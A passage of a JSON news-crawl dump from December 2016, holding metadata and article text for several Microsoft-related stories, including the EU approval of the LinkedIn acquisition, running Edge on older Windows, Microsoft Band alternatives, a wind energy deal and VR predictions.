        "url": "http://omgili.com/ri/t1o2C2H78Uegmcb5dbBwUknOrT6ndlHl4UKoURtjc_oT9_SF0.vP3r3hoq4Hk.HUFaJoN8PjOAEkfK.L51VwzAisbbcPSoUp2K_uLtfdU.cS2G0QCMgEiciBP6wwFQPpObGsIwC9EAU-",
        "site_full": "diginomica.com",
        "site": "diginomica.com",
        "site_section": "http://feeds.feedburner.com/diginomica2",
        "site_categories": [
          "tech",
          "business"
        ],
        "section_title": "diginomica",
        "title": "Microsoft out to save the post-Trump, post-Brexit world as Europe nods through LinkedIn buy",
        "title_full": "Microsoft out to save the post-Trump, post-Brexit world as Europe nods through LinkedIn buy",
        "published": "2016-12-07T14:09:54.261+02:00",
        "replies_count": 0,
        "participants_count": 1,
        "site_type": "blogs",
        "country": "US",
        "spam_score": 0.0,
        "main_image": "http://16315-presscdn-0-27.pagely.netdna-cdn.com/wp-content/uploads/2016/06/weiner-nadella-.png",
        "performance_score": 0,
        "domain_rank": 84745,
        "social": {
          "facebook": {
            "likes": 0,
            "comments": 0,
            "shares": 0
          },
          "gplus": {
            "shares": 0
          },
          "pinterest": {
            "shares": 0
          },
          "linkedin": {
            "shares": 0
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "ca4cd1ae7b43e652ba6b94c133b581c7474cee87",
      "url": "http://omgili.com/ri/t1o2C2H78Uegmcb5dbBwUknOrT6ndlHl4UKoURtjc_oT9_SF0.vP3r3hoq4Hk.HUFaJoN8PjOAEkfK.L51VwzAisbbcPSoUp2K_uLtfdU.cS2G0QCMgEiciBP6wwFQPpObGsIwC9EAU-",
      "ord_in_thread": 0,
      "author": "Stuart Lauchlan",
      "published": "2016-12-07T14:09:54.261+02:00",
      "title": "Microsoft out to save the post-Trump, post-Brexit world as Europe nods through LinkedIn buy",
      "text": "0 Comments Weiner and Nadella – saving the world \nMicrosoft says that it now has regulatory approval from the European Commission to enable its $26 billion acquisition of LinkedIn to go ahead, but it has had to make some concessions in order to do so. \nThe firm has had to commit that for the next five years it will: Continue to make the Office Add-in program available to third-party professional social networking services. The Office Add-in program enables developers to integrate their services into Microsoft Outlook, Word, PowerPoint and Excel, providing users an enhanced experience using Office. Ensure that IT administrators and users can choose whether to display in the Office user interface the LinkedIn profile and activity information that may be integrated in the future. Not pre-install a LinkedIn application or tile that would favor LinkedIn on an exclusive basis on PCs in the European Economic Area. Not use Windows itself to prompt users to install a possible LinkedIn application, although it can remain available in the Windows Store and be promoted in other ways. Provide users with a way to unbundle any LinkedIn application for Windows PCs that PC manufacturers elect to install on their machines. \nIt’s a blow for Salesforce, which l ost out to Microsoft in the bidding war for LinkedIn and which complained to the European Commission that its former BFF looked set to abuse its ownership of LinkedIn data . \nParticular concerns were that organizations buying LinkedIn’s sales intelligence solutions would also have to purchase Microsoft’s CRM and that rival CRM vendors wouldn’t have access to the full LinkedIn database, thus preventing them from developing advanced functionality, such as machine learning. \nBut in its findings, the Commission states: \nWhile the customer base of the two products does overlap, LinkedIn’s product is one of several on the market and does not appear to be a “must have” solution. On the second concern, the Commission also found that access to the full LinkedIn database is not essential to compete on the market. \nSalesforce’s market leadership in the CRM space didn’t help its case either, with the Commission dubbing Microsoft “a relatively small player” compared to Oracle, SAP and Salesforce. Therefore it concluded that it was unlikely that Microsoft could use LinkedIn to eliminate competition. \nWhile its argument has not passed muster in Brussels, Salesforce’s Chief Legal Officer Burke Norton says that regulators need to keep Microsoft under scrutiny: \nGiven Microsoft’s history and existing monopolies, it will be necessary for antitrust enforcement agencies to be vigilant to ensure that Microsoft operates in a manner that promotes competition, rather than stifles it. As AI, machine learning and other technologies continue to advance, questions around access to critical datasets will only become more important and Salesforce will continue to share its views with regulators and policymakers around the world about the ways in which access to data is emerging as a key issue in competition policy. \nThe Commission emphasised that its decision is conditional on full compliance with the commitments required and that this would be monitored by a trustee. But Commissioner Margrethe Vestager, in charge of competition policy, said: \nA growing number of Europeans subscribe to professional social networks. These networks are important for professionals to connect and interact and to find new career opportunities. Today’s decision ensures that Europeans will continue to enjoy a freedom of choice between professional social networks. Saving the world \nMeanwhile in a somewhat OTT blog post , Microsoft’s Chief Legal Officer Brad Smith paints the now guaranteed acquisition as for the greater good of the entire world in a post-Brexit, post-Trump age: \nIn June, Satya Nadella and Jeff Weiner, the CEOs of Microsoft and LinkedIn, announced their shared vision for bringing together the world’s leading professional cloud with the world’s leading professional network. Just ten days after they announced this combination, voters in the United Kingdom voted to leave the European Union. And roughly five months after that, a tumultuous presidential election campaign in the United States came to a close. On both sides of the Atlantic, it has become increasingly apparent that many people feel left out and unable to participate in the economic growth and opportunities created by the rising digital economy. \nWhile technology tools are not a panacea for current economic challenges, we believe they can make an important contribution. Microsoft and LinkedIn together have a bigger opportunity to help people online to develop and earn credentials for new skills, identify and pursue new jobs, and become more creative and productive as they work with their colleagues. Working together we can do more to serve not only those with college degrees, but the many people pursuing new experiences, skills and credentials related to vocational training and so-called middle skills. Our ambition is to do our part to create more opportunity for people who haven’t shared in recent economic growth. \nAnd the role that Microsoft/LinkedIn will play in all this? Simple, says Smith: \nThrough Microsoft Philanthropies, we’ll invest more than any other company to bring digital skills to schools. Through our Affordable Access initiative and new wireless broadband “TV White Spaces” technologies, we’ll help bring broadband access to more rural communities. And with the LinkedIn Economic Graph, with its data on local job growth and skills needs, there is an expanded opportunity to help governments use better data and analytical capabilities to pursue economic development strategies to help connect people with new opportunities. \nBut there’s at least a final stab at self-effacement to conclude: \nWe readily recognize that no single company can come close to solving the many economic challenges that confront the world today. Perhaps more than anything else, governments will need to continue to innovate across a wide array of education, training and labor policies. And across the private and public sectors, we all will need to come together and act with a sense of shared responsibility. My take \nLeaving aside Smith’s florid ‘save the world’ proclamations, this was always the most likely outcome, even taking into account the instinctive anti-trust zealotry of Vestager and the European Commission’s previous antipathy towards Microsoft. The commitments that have been put in place will need to be adhered to and any attempt to water them down tackled, but Microsoft has won its battle on this occasion and gained itself a major asset. \nImage credit - Microsoft \nDisclosure - At time of writing, Oracle, Salesforce and SAP are premier partners of diginomica.",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [],
      "entities": {
        "persons": [
          {
            "name": "nadella",
            "sentiment": "neutral"
          },
          {
            "name": "weiner",
            "sentiment": "neutral"
          },
          {
            "name": "brad smith",
            "sentiment": "none"
          },
          {
            "name": "smith",
            "sentiment": "none"
          },
          {
            "name": "satya nadella",
            "sentiment": "none"
          },
          {
            "name": "salesforce",
            "sentiment": "none"
          },
          {
            "name": "burke norton",
            "sentiment": "none"
          },
          {
            "name": "margrethe vestager",
            "sentiment": "none"
          },
          {
            "name": "jeff weiner",
            "sentiment": "none"
          }
        ],
        "organizations": [
          {
            "name": "microsoft",
            "sentiment": "neutral"
          },
          {
            "name": "commission",
            "sentiment": "none"
          },
          {
            "name": "european union",
            "sentiment": "none"
          },
          {
            "name": "sap",
            "sentiment": "none"
          },
          {
            "name": "salesforce",
            "sentiment": "none"
          },
          {
            "name": "oracle",
            "sentiment": "none"
          },
          {
            "name": "european economic area",
            "sentiment": "none"
          },
          {
            "name": "microsoft philanthropies",
            "sentiment": "none"
          },
          {
            "name": "linkedin",
            "sentiment": "none"
          },
          {
            "name": "european commission",
            "sentiment": "none"
          },
          {
            "name": "linkedin economic graph",
            "sentiment": "none"
          }
        ],
        "locations": [
          {
            "name": "europe",
            "sentiment": "none"
          },
          {
            "name": "atlantic",
            "sentiment": "none"
          },
          {
            "name": "united states",
            "sentiment": "none"
          },
          {
            "name": "brussels",
            "sentiment": "none"
          },
          {
            "name": "united kingdom",
            "sentiment": "none"
          }
        ]
      },
      "crawled": "2016-12-07T14:09:54.261+02:00"
    },
    {
      "thread": {
        "uuid": "6d424ca92f9b9e637a51cb0d2d79a9feb2bcf300",
        "url": "http://omgili.com/ri/jHIAmI4hxg9l15JWbPLCRBqAVOzCCuQitxwlP3qj25660mLUKzbNKmNPmX8LwjGG3sJU5.TVRxFNhaXeMbDRwwSAdHGTOZ8ACWCVlL1ml4o4mzuhknI9XgdA5mXVPGl.",
        "site_full": "www.intowindows.com",
        "site": "intowindows.com",
        "site_section": "http://feeds.feedburner.com/intowindows",
        "site_categories": [
          "tech"
        ],
        "section_title": "Into Windows",
        "title": "How Do I Install Microsoft Edge On Windows 7 Or Windows 8/8.1?",
        "title_full": "How Do I Install Microsoft Edge On Windows 7 Or Windows 8/8.1?",
        "published": "2016-12-07T14:29:32.524+02:00",
        "replies_count": 0,
        "participants_count": 1,
        "site_type": "blogs",
        "country": "US",
        "spam_score": 0.0,
        "main_image": "http://www.intowindows.com/wp-content/uploads/2016/12/microsoft-edge-for-windows-7-and-Windows-8.1-pic01_thumb.png",
        "performance_score": 0,
        "domain_rank": 22564,
        "social": {
          "facebook": {
            "likes": 0,
            "comments": 0,
            "shares": 0
          },
          "gplus": {
            "shares": 0
          },
          "pinterest": {
            "shares": 0
          },
          "linkedin": {
            "shares": 0
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "6d424ca92f9b9e637a51cb0d2d79a9feb2bcf300",
      "url": "http://omgili.com/ri/jHIAmI4hxg9l15JWbPLCRBqAVOzCCuQitxwlP3qj25660mLUKzbNKmNPmX8LwjGG3sJU5.TVRxFNhaXeMbDRwwSAdHGTOZ8ACWCVlL1ml4o4mzuhknI9XgdA5mXVPGl.",
      "ord_in_thread": 0,
      "author": "admin",
      "published": "2016-12-07T14:29:32.524+02:00",
      "title": "How Do I Install Microsoft Edge On Windows 7 Or Windows 8/8.1?",
      "text": "  Edge » How Do I Install Microsoft Edge On Windows 7 Or Windows 8/8.1? How Do I Install Microsoft Edge On Windows 7 Or Windows 8/8.1? admin Published   \nFrom Windows 95 to Windows 8/8.1, Internet Explorer had been the default web browser of Windows operating system for two decades. Over the years, Microsoft Internet Explorer became bloated and insecure, making security conscious users look for third-party web browsers. \nWith Windows 10, Microsoft introduced Edge, a modern web browser built from scratch, and is the default web browser in Windows 10 . \nMicrosoft Edge , the new browser from Microsoft, is part of Windows 10, and can’t be downloaded separately from Store. \nLike Google Chrome and Firefox, the Edge browser is fast and loads pages much faster compared to Internet Explorer. Besides that, it offers a clean interface which most users love. The browser recently got support for extensions , and there are a couple of good extensions already available for the new web browser from Microsoft. Is Microsoft Edge available for Windows 7 or Windows 8/8.1? \nWhen Microsoft introduced Edge browser for the first time, a significant number of PC users running Windows 7 and Windows 8/8.1 were expecting Microsoft release Edge for Windows 7 and Windows 8/8.1 as well. \nThe truth is that Edge browser is not and will not be available for Windows 7 or Windows 8/8.1. Is there is a workaround to install Edge on Windows 7 or Windows 8/8.1? \nOne can’t install Edge on Windows 7 as the Edge browser is built on the new Universal Windows Platform. The Universal Windows Platform was first introduced with Windows 8 as the Windows Runtime. So theoretically it should be possible to install Edge on Windows 8/8.1 but then Edge is not officially or unofficially available for Windows 8 or 8.1 right now. \nThat said, there is a not so cool way out there to run Edge on Windows 7 or Windows 8/8.1. You can run Edge on previous versions of Windows using free virtual machines. Visit this page of Microsoft to download Microsoft Edge virtual machine for VirtualBox , Windows Hyper-V , Vagrant, VMware (Windows & Mac), and Parallels (Mac only). \nThe download page also contains a link to installation instructions page so that you can easily install the downloaded Edge virtual machine on your Windows 7 or Windows 8/8.1 PC using above mentioned virtual machine software. Can I make my web browser look like Edge? \nIf you love the clean user interface of Edge and use Mozilla Firefox as the default browser, then you can make Mozilla Firefox look like Edge by installing the Edge for Firefox theme. \nSadly, the Edge theme is currently available for Firefox only. So, if you are a user of Internet Explorer, Chrome, or any web browser, you have no option but to upgrade your Windows 7 or Windows 8/8.1 to Windows 10 to get Edge. What’s the best way to experience Edge? \nThe easiest and best way to experience Edge is to upgrade your PC to Windows 10 or get a new PC pre-installed with Windows 10. \nNote that Windows 10 is no longer officially available as a free upgrade for Windows 7 and Windows 8.1 users but most users who upgrade to Windows 10 are getting free upgrade even today (December 2016).",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [],
      "entities": {
        "persons": [],
        "organizations": [
          {
            "name": "microsoft",
            "sentiment": "neutral"
          },
          {
            "name": "mozilla firefox",
            "sentiment": "none"
          },
          {
            "name": "firefox",
            "sentiment": "none"
          },
          {
            "name": "google",
            "sentiment": "none"
          },
          {
            "name": "vmware",
            "sentiment": "none"
          }
        ],
        "locations": []
      },
      "crawled": "2016-12-07T14:29:32.524+02:00"
    },
    {
      "thread": {
        "uuid": "fe32f92f87ab89a03e3ad85683e1e4aa13dd5eb5",
        "url": "http://omgili.com/ri/jHIAmI4hxg8Dz0oGWW1_sGVZrduq_.2L7dGR.Hol3qTv3nBaxA6PU2YmaBwFW53efIcKJu.kx69atcmwG5Pw7A--",
        "site_full": "www.windowscentral.com",
        "site": "windowscentral.com",
        "site_section": "http://www.windowscentral.com/",
        "site_categories": [
          "news",
          "tech"
        ],
        "section_title": "Windows Central - News, Forums, Reviews, Help for Windows Phone",
        "title": "Best Alternatives to Microsoft Band",
        "title_full": "Best Alternatives to Microsoft Band",
        "published": "2016-12-07T15:04:25.143+02:00",
        "replies_count": 0,
        "participants_count": 1,
        "site_type": "blogs",
        "country": "US",
        "spam_score": 0.0,
        "main_image": null,
        "performance_score": 0,
        "domain_rank": 3278,
        "social": {
          "facebook": {
            "likes": 0,
            "comments": 0,
            "shares": 0
          },
          "gplus": {
            "shares": 0
          },
          "pinterest": {
            "shares": 0
          },
          "linkedin": {
            "shares": 0
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "fe32f92f87ab89a03e3ad85683e1e4aa13dd5eb5",
      "url": "http://omgili.com/ri/jHIAmI4hxg8Dz0oGWW1_sGVZrduq_.2L7dGR.Hol3qTv3nBaxA6PU2YmaBwFW53efIcKJu.kx69atcmwG5Pw7A--",
      "ord_in_thread": 0,
      "author": "Luke Filipowicz",
      "published": "2016-12-07T15:04:25.143+02:00",
      "title": "Best Alternatives to Microsoft Band",
      "text": "\nWith the Microsoft Band fading away, we thought we would offer some great alternatives.\nMicrosoft is jumping off the Band-wagon. Literally. The Microsoft Band line has been pulled from its store, and there are no plans for a new model in the new year. If you want you can still order the Band 2 through Amazon while supplies last, but if you're hesitant to purchase something that is losing support (and no one will blame you for that) there are other options for you to consider.\nFitbit Charge 2 Fitbit Blaze Garmin Vivosmart HR+ Vector Smartwatch \nFitbit Charge 2 \nOne of the latest additions to the Fitbit lineup, the Charge 2 packs a lot of features into a device that only carries a price tag of about $150.\nThe Charge 2 tracks all the necessities, steps per day, calories burned, and active minutes, and you can see all that information on a bright OLED black and white display, and with Fitbit PurePulse heart rate monitor attached to the back, you're bound to get quite accurate results.\n",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [],
      "entities": {
        "persons": [],
        "organizations": [
          {
            "name": "microsoft",
            "sentiment": "neutral"
          }
        ],
        "locations": [
          {
            "name": "amazon",
            "sentiment": "none"
          }
        ]
      },
      "crawled": "2016-12-07T15:04:25.143+02:00"
    },
    {
      "thread": {
        "uuid": "bb9919ff74bdea2e12d3cadcab960a3a8c88d90b",
        "url": "http://omgili.com/ri/j.JM_ertN3IcwVf7SoB0OcgLJQhQNcY.gzg_SXv6fsGKVASPAYwCBzA_VmQRwVvsiQzy_UhO4R.KhhenmGTEPjmXhZgEMKoP32.vLnaPx01cu3Vzn3CTe4Y_aS6bfks5rGxEsc_uj_HmCFpa3bVcm_JsQgHP.z_sb2dyPi2ZYYTC.zmxuYUoNA--",
        "site_full": "energy.einnews.com",
        "site": "einnews.com",
        "site_section": "http://feeds.feedburner.com/EnergyTechnologyNews",
        "site_categories": [],
        "section_title": "Energy Technology News",
        "title": "Tech giants team up to fight terrorist propaganda: YouTube, Facebook, Twitter, and Microsoft will share 'digital fingerprints' of removed posts",
        "title_full": "Tech giants team up to fight terrorist propaganda: YouTube, Facebook, Twitter, and Microsoft will share 'digital fingerprints' of removed posts",
        "published": "2016-12-07T12:44:00.000+02:00",
        "replies_count": 0,
        "participants_count": 0,
        "site_type": "news",
        "country": "US",
        "spam_score": 0.0,
        "main_image": "",
        "performance_score": 0,
        "domain_rank": 43867,
        "social": {
          "facebook": {
            "likes": 0,
            "comments": 0,
            "shares": 0
          },
          "gplus": {
            "shares": 0
          },
          "pinterest": {
            "shares": 0
          },
          "linkedin": {
            "shares": 0
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "bb9919ff74bdea2e12d3cadcab960a3a8c88d90b",
      "url": "http://omgili.com/ri/j.JM_ertN3IcwVf7SoB0OcgLJQhQNcY.gzg_SXv6fsGKVASPAYwCBzA_VmQRwVvsiQzy_UhO4R.KhhenmGTEPjmXhZgEMKoP32.vLnaPx01cu3Vzn3CTe4Y_aS6bfks5rGxEsc_uj_HmCFpa3bVcm_JsQgHP.z_sb2dyPi2ZYYTC.zmxuYUoNA--",
      "ord_in_thread": 0,
      "author": "",
      "published": "2016-12-07T12:44:00.000+02:00",
      "title": "Tech giants team up to fight terrorist propaganda: YouTube, Facebook, Twitter, and Microsoft will share 'digital fingerprints' of removed posts",
      "text": "Tech giants team up to fight terrorist propaganda: YouTube, Facebook, Twitter, and Microsoft will share 'digital ... 05:44 GMT \nAuckland News.Net - Wednesday 7th December, 2016 Primary Industries Minister Nathan Guy has welcomed the New Zealand Horticulture Export Authority Amendment Bill passing its third reading in Parliament last night. \"Horticulture is now New ... Auckland News.Net - Wednesday 7th December, 2016 The youth justice system will be extended to include lower risk 17 year-olds, Justice … ( continue reading )",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [],
      "entities": {
        "persons": [
          {
            "name": "nathan guy",
            "sentiment": "none"
          }
        ],
        "organizations": [
          {
            "name": "facebook",
            "sentiment": "neutral"
          },
          {
            "name": "youtube",
            "sentiment": "neutral"
          },
          {
            "name": "tech giants",
            "sentiment": "neutral"
          },
          {
            "name": "microsoft",
            "sentiment": "neutral"
          },
          {
            "name": "new zealand horticulture export authority",
            "sentiment": "none"
          },
          {
            "name": "parliament",
            "sentiment": "none"
          },
          {
            "name": "auckland news.net",
            "sentiment": "none"
          },
          {
            "name": "primary industries",
            "sentiment": "none"
          }
        ],
        "locations": []
      },
      "crawled": "2016-12-07T15:56:00.745+02:00"
    },
    {
      "thread": {
        "uuid": "3c45e0ec8efdbf0fd93730beb7b29bd2dbd6d926",
        "url": "http://omgili.com/ri/jHIAmI4hxg8KSMTvPVjIlisnYmQDt50k3dtGZxnThm00YtmU7bfWkCAQ0ieQ19nX",
        "site_full": "www.ooyuz.com",
        "site": "ooyuz.com",
        "site_section": "http://www.ooyuz.com/newsanalysis?term=new hope",
        "site_categories": [],
        "section_title": "new hope News Results and Analysis |OOYUZ",
        "title": "Microsoft Highlights Real People Making A Difference To Capture The Holiday Spirit",
        "title_full": "Microsoft Highlights Real People Making A Difference To Capture The Holiday Spirit : Related Articles | OOYUZ",
        "published": "2016-12-05T18:04:00.000+02:00",
        "replies_count": 0,
        "participants_count": 1,
        "site_type": "news",
        "country": "US",
        "spam_score": 0.001,
        "main_image": "",
        "performance_score": 0,
        "domain_rank": 53324,
        "social": {
          "facebook": {
            "likes": 0,
            "comments": 0,
            "shares": 0
          },
          "gplus": {
            "shares": 0
          },
          "pinterest": {
            "shares": 0
          },
          "linkedin": {
            "shares": 0
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "3c45e0ec8efdbf0fd93730beb7b29bd2dbd6d926",
      "url": "http://omgili.com/ri/jHIAmI4hxg8KSMTvPVjIlisnYmQDt50k3dtGZxnThm00YtmU7bfWkCAQ0ieQ19nX",
      "ord_in_thread": 0,
      "author": "Forbes",
      "published": "2016-12-05T18:04:00.000+02:00",
      "title": "Microsoft Highlights Real People Making A Difference To Capture The Holiday Spirit",
      "text": "Microsoft’s new holiday spot, Art of Harmony highlights those individuals who are changing the world, and positively influencing all of us by driving their vision of “hope, peace and beauty.” The seven local heroes featured in the campaign gained their fame this year by standing up for their beliefs. At a time when many feel the country is divided, Microsoft’s message is one of togetherness and the simultaneous power of an individual’s personal impact. The cast is comprised of real people .. Advertisement",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [],
      "entities": {
        "persons": [],
        "organizations": [
          {
            "name": "microsoft",
            "sentiment": "neutral"
          }
        ],
        "locations": []
      },
      "crawled": "2016-12-07T16:09:26.869+02:00"
    },
    {
      "thread": {
        "uuid": "4b7b3812b0fdc454a527211456a1c82609e48a5c",
        "url": "http://omgili.com/ri/.wHSUbtEfZQJLkyyhGzg_bzp3VOUbew4bT_WRfFq8AzNY3f.Uew0BYv6TrS2h9XH5o8wDvEHDUelKqSOucVhj0KWFP2SoQ7WT5wwbTmDUspeWZPEPxm25g--",
        "site_full": "www.environmental-expert.com",
        "site": "environmental-expert.com",
        "site_section": "http://www.environmental-expert.com/rss/news-8/energy-renewables",
        "site_categories": [
          "education",
          "business"
        ],
        "section_title": "Energy &amp; Renewables News in Environmental XPRT",
        "title": "Texas wind generation hits record",
        "title_full": "Texas wind generation hits record",
        "published": "2016-12-07T06:00:00.000+02:00",
        "replies_count": 0,
        "participants_count": 0,
        "site_type": "news",
        "country": "US",
        "spam_score": 0.0,
        "main_image": "/files/21154/images/EUCI-150.jpg",
        "performance_score": 0,
        "domain_rank": 57799,
        "social": {
          "facebook": {
            "likes": 0,
            "comments": 0,
            "shares": 0
          },
          "gplus": {
            "shares": 0
          },
          "pinterest": {
            "shares": 0
          },
          "linkedin": {
            "shares": 0
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "4b7b3812b0fdc454a527211456a1c82609e48a5c",
      "url": "http://omgili.com/ri/.wHSUbtEfZQJLkyyhGzg_bzp3VOUbew4bT_WRfFq8AzNY3f.Uew0BYv6TrS2h9XH5o8wDvEHDUelKqSOucVhj0KWFP2SoQ7WT5wwbTmDUspeWZPEPxm25g--",
      "ord_in_thread": 0,
      "author": "",
      "published": "2016-12-07T06:00:00.000+02:00",
      "title": "Texas wind generation hits record",
      "text": "Microsoft announces largest ever wind energy purchase Nov. 30, 2016 \nMicrosoft inked its largest wind energy deal to date earlier this month, signing two agreements representing 237 megawatts (MW) of wind capacity, bringing Microsoft’s total investment in wind energy in the U.S. to over 500 megawatts. Microsoft has contracted with Allianz Risk Transfer to acquire energy from the new 178 MW Bloom Wind project in Kansas, as well as with Black Hills Energy to buy 59 MW from two wind projects near Microsoft’s Cheyenne, Wyoming data center site. The output from both wind... Gamesa wins supply agreement for 155 MW for a Terna Energy wind farm in the United States Nov. 29, 2016 \nGamesa, a global leader in wind energy, has entered into an agreement with Terna Energy for the supply of 74 of its G114-2.1 MW turbines (155 MW) at a wind complex being developed in Texas, in southern United States. This order is included in the third-quarter order intake figure already disclosed, which amounted to 1.090 MW. Under the terms of the agreement, Gamesa will deliver and commission the project and supply Operation and Maintenance services for 5 years. The turbines are slated for delivery in 2017,... One of the World`s Largest Wind Farms Counts on Lufft VENTUS Wind Sensor Nov. 14, 2016 \n296 turbines of the AES Corporation are located by Buffalo Gap, Texas, US.With a capacity of 524 MW it`s the world`s seventh largest wind farm to-date.The article link below provides a summary of how Performance Engineer at AES, Tristan Lee, was able to optimize the performance of its aging fleet using latest in technology, that includes the Lufft Ventus Ultrasonic Wind Speed and Wind Direction Sensor.Tristan was able to increase energy production by using the air density and wind conditions provided by the... Gamesa continues to make inroads into the US market with a new contract for the supply of 99 MW Nov. 8, 2016 \nThe company will supply G114-2.0 MW and G114-2.1 MW wind turbines for a wind farm located in the central United States. Gamesa, a technological leader in the global wind industry, has been awarded a contract for the supply of 99 MW[1] for a wind farm in the south central United States. The wind farm will utilize 48 G114-2.0 MW turbines and G114-2.1 MW turbines. Gamesa will deliver and commission the turbines slated for delivery in 2017, with the project to go into commercial operation the same year. Optimi... Consortium with EDP Renewables is selected for floating wind farm pilot project in France Nov. 8, 2016 \nConsortium with EDP Renewables is selected for floating wind farm pilot project in France The EDP Renewables, ENGIE, Caisse des Dépôts, Eiffage/Principle Power and GE consortium’s floating wind farm pilot project in the Mediterranean has been selected by the Government of France. This verdict recognises the innovative technological decisions, experience and know-how of the consortium, whose goal is to make floating wind power a competitive alternative within the energy mix, together with... Customer comments",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [],
      "entities": {
        "persons": [
          {
            "name": "tristan lee",
            "sentiment": "none"
          }
        ],
        "organizations": [
          {
            "name": "microsoft",
            "sentiment": "neutral"
          },
          {
            "name": "terna energy",
            "sentiment": "none"
          },
          {
            "name": "ge",
            "sentiment": "none"
          },
          {
            "name": "edp renewables",
            "sentiment": "none"
          },
          {
            "name": "gamesa",
            "sentiment": "none"
          },
          {
            "name": "aes",
            "sentiment": "none"
          },
          {
            "name": "black hills energy",
            "sentiment": "none"
          },
          {
            "name": "eiffage/principle power",
            "sentiment": "none"
          },
          {
            "name": "buffalo gap",
            "sentiment": "none"
          },
          {
            "name": "allianz risk transfer",
            "sentiment": "none"
          },
          {
            "name": "caisse des dépôts",
            "sentiment": "none"
          },
          {
            "name": "aes corporation",
            "sentiment": "none"
          }
        ],
        "locations": [
          {
            "name": "texas",
            "sentiment": "none"
          },
          {
            "name": "france",
            "sentiment": "none"
          },
          {
            "name": "united states",
            "sentiment": "none"
          },
          {
            "name": "wyoming",
            "sentiment": "none"
          },
          {
            "name": "us",
            "sentiment": "none"
          },
          {
            "name": "mediterranean",
            "sentiment": "none"
          },
          {
            "name": "kansas",
            "sentiment": "none"
          },
          {
            "name": "u.s.",
            "sentiment": "none"
          },
          {
            "name": "cheyenne",
            "sentiment": "none"
          },
          {
            "name": "engie",
            "sentiment": "none"
          }
        ]
      },
      "crawled": "2016-12-07T18:56:37.385+02:00"
    },
    {
      "thread": {
        "uuid": "d86bd2f0cad448c660a1601b0efe16e66cc51d87",
        "url": "http://omgili.com/ri/snFTpiOKdJWKdIMIpzFquLBqypSJeWvj_5EccnMacPcdlsjESr0Wc2VFS5UPe5cAXFfoFYoALB6vjxEcslFy_n1jthy5VUi5MHm6NRq9oTFW4ruCDbley924DtTJ4Yck",
        "site_full": "nypost.com",
        "site": "nypost.com",
        "site_section": "http://nypost.com/feed/",
        "site_categories": [
          "news"
        ],
        "section_title": "New York Post",
        "title": "Microsoft thinks virtual reality is the digital LSD of the future | New York Post",
        "title_full": "Microsoft thinks virtual reality is the digital LSD of the future | New York Post",
        "published": "2016-12-07T18:52:00.000+02:00",
        "replies_count": 0,
        "participants_count": 1,
        "site_type": "blogs",
        "country": "US",
        "spam_score": 0.0,
        "main_image": "https://thenypost.files.wordpress.com/2016/12/161207-microsoft-vr-trippy-feature.jpg?quality=90&amp;strip=all&amp;w=1200",
        "performance_score": 0,
        "domain_rank": 709,
        "social": {
          "facebook": {
            "likes": 0,
            "comments": 0,
            "shares": 0
          },
          "gplus": {
            "shares": 0
          },
          "pinterest": {
            "shares": 0
          },
          "linkedin": {
            "shares": 0
          },
          "stumbledupon": {
            "shares": 0
          },
          "vk": {
            "shares": 0
          }
        }
      },
      "uuid": "d86bd2f0cad448c660a1601b0efe16e66cc51d87",
      "url": "http://omgili.com/ri/snFTpiOKdJWKdIMIpzFquLBqypSJeWvj_5EccnMacPcdlsjESr0Wc2VFS5UPe5cAXFfoFYoALB6vjxEcslFy_n1jthy5VUi5MHm6NRq9oTFW4ruCDbley924DtTJ4Yck",
      "ord_in_thread": 0,
      "author": "Jasper Hamill, The Sun",
      "published": "2016-12-07T18:52:00.000+02:00",
      "title": "Microsoft thinks virtual reality is the digital LSD of the future | New York Post",
      "text": "Virtual reality technology will soon be so powerful that it will cause drug-like hallucinations, Microsoft has predicted.\nOne of the tech firm’s top researchers said VR would be able to warp reality and catapult users into a new world.\nIn the golden age of the 1960s, psychedelic adventurers used LSD to produce a similar effect, often getting naked and enjoying unabashed sex soundtracked by some of the best music ever written.\nBut anyone looking to trip out on virtual reality will probably do so alone in their room, wearing a helmet and unlikely to be touched by another human being.\nMar Gonzalez Franco, a researcher at Microsoft’s Redmond headquarters, said: “By 2027 we will have ubiquitous virtual reality systems that will provide such rich multisensorial experiences that will be capable of producing hallucinations which blend or alter perceived reality.”\n“Using this technology, humans will retrain, recalibrate and improve their perceptual systems.”\nThe technology will also be refined to incorporate “haptic” systems, which simulate touching or being touched.\nA woman tries the Samsung Gear VR at VidCon in Los Angeles, California on June 23, 2016. Photo: Getty Images Franco added: “In contrast to current virtual reality systems that only stimulate visual and auditory senses, in the future the experience will expand to other sensory modalities including tactile with haptic devices.”\nThe tech expert was speaking as part of a project which quizzed Microsoft’s female employees about their predictions for the future .\nMost of them said artificial intelligence would play a greater role in our lives, bossing us about and saving us from making “sub-optimal decisions.”\nIf you think that sounds pretty miserable, wait until you hear what we’ll be doing instead of working.\nNicole Immorlica, senior researcher, New England research lab, said: “By 2027, automation will give rise to a new economy in which most people’s societal contribution comes from the data they generate as they go about their lives rather than the work they do.”\nWhat this means is that in 10 years we’ll be under constant surveillance and milked for the data we produce, with nothing to look forward to except a lonely evening spent getting high in virtual reality.\nThanks Microsoft.\n  This article originally appeared on The Sun .",
      "highlightText": "",
      "highlightTitle": "",
      "language": "english",
      "external_links": [],
      "entities": {
        "persons": [
          {
            "name": "mic",
            "sentiment": "neutral"
          },
          {
            "name": "nicole immorlica",
            "sentiment": "none"
          },
          {
            "name": "redmond",
            "sentiment": "none"
          },
          {
            "name": "franco",
            "sentiment": "none"
          },
          {
            "name": "mar gonzalez franco",
            "sentiment": "none"
          }
        ],
        "organizations": [
          {
            "name": "new york post",
            "sentiment": "neutral"
          },
          {
